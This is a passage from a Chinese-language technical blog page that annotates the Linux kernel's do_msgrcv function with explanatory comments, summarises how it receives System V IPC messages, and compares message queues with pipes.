<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">	       <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax)); <span class="comment">/* 调用&quot;load_msg(buf, bufsz)&quot;,生成msg_msg为copy做准备 */</span></span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">	&#125;</span><br><span class="line">	mode = convert_mode(&amp;msgtyp, msgflg);</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid); <span class="comment">/* 通过msqid从namespace中找到对应的msq-&gt;q_perm结构体,然后调用container_of通过偏移计算得到msg_queue结构体地址 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msq);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_receiver</span> <span class="title">msr_d</span>;</span> <span class="comment">/* 定义了接收消息链表 */</span></span><br><span class="line"></span><br><span class="line">		msg = ERR_PTR(-EACCES);</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IRUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line"></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			msg = ERR_PTR(-EIDRM);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		msg = find_msg(msq, &amp;msgtyp, mode); <span class="comment">/* 查找可用的msg */</span></span><br><span class="line">		<span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">				msg = ERR_PTR(-E2BIG);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">				msg = copy_msg(msg, copy); <span class="comment">/* MSG_COPY:将message拷贝一份后再拷贝到用户空间 */</span></span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			list_del(&amp;msg-&gt;m_list); <span class="comment">/* 把已经接收过数据的msg脱链 */</span></span><br><span class="line">			msq-&gt;q_qnum--;</span><br><span class="line">			msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">			ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">			msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">			atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">			atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">			ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* No message waiting. Wait for a message */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123; <span class="comment">/* IPC_NOWAIT:如果没有符合条件的msg则立即返回 */</span> </span><br><span class="line">			msg = ERR_PTR(-ENOMSG);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		list_add_tail(&amp;msr_d.r_list, &amp;msq-&gt;q_receivers); <span class="comment">/* 插入msg_msg链表尾 */</span></span><br><span class="line">		msr_d.r_tsk = current;</span><br><span class="line">		msr_d.r_msgtype = msgtyp;</span><br><span class="line">		msr_d.r_mode = mode;</span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; MSG_NOERROR)</span><br><span class="line">			msr_d.r_maxsize = INT_MAX;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			msr_d.r_maxsize = bufsz;</span><br><span class="line">		msr_d.r_msg = ERR_PTR(-EAGAIN);</span><br><span class="line">		__set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line">		rcu_read_lock();</span><br><span class="line"></span><br><span class="line">		msg = READ_ONCE(msr_d.r_msg); <span class="comment">/* 读出msg变量 */</span></span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line"></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		msg = msr_d.r_msg;</span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		list_del(&amp;msr_d.r_list); </span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123; <span class="comment">/* 仅仅检查一下是否有信号,不处理信号 */</span></span><br><span class="line">			msg = ERR_PTR(-ERESTARTNOHAND);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bufsz = msg_handler(buf, msg, bufsz); <span class="comment">/* 这里的msg_handler就是do_msg_fill */</span></span><br><span class="line">	free_msg(msg);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里总结一下 <code>do_msgrcv</code> 的功能：<ul>
<li>调用 <code>prepare_copy</code> 为后面的复制做准备（在底层还是调用 <code>load_msg</code> 创建一个 msg_msg 结构体，再把数据拷贝到该 msg_msg 的后面）</li>
<li>通过 msqid 计算得到 msg_queue 结构体地址</li>
<li>调用 <code>find_msg</code> 查找可用的 msg_msg 结构体（这些 msg_msg 都是 <code>msgsnd</code> 发送出来的）</li>
<li>调用 <code>do_msg_fill-&gt;store_msg-&gt;copy_to_user</code> 把 msg_msg 中的内容传输到用户态</li>
</ul>
</li>
</ul>
<p><strong>msg VS Pipe</strong></p>
<p>同样是进程间的通信，那么消息队列与管道相较而言有哪些优势和劣势：</p>
<ul>
<li>优点：<ul>
<li>消息队列收发消息自动保证了同步，不需要由进程自己来提供同步方法，而命名管道需要自行处理同步问题</li>
<li>消息队列接收数据可以根据消息类型有选择的接收特定类型的数据，不需要像命名管道一样默认接收数据</li>
</ul>
</li>
<li>缺点： <ul>
<li>发送和接受的每个数据都有最大的长度限制</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/17/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><span class="page-number current">18</span><a class="page-number" href="/page/19/">19</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/19/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">331</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:46</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
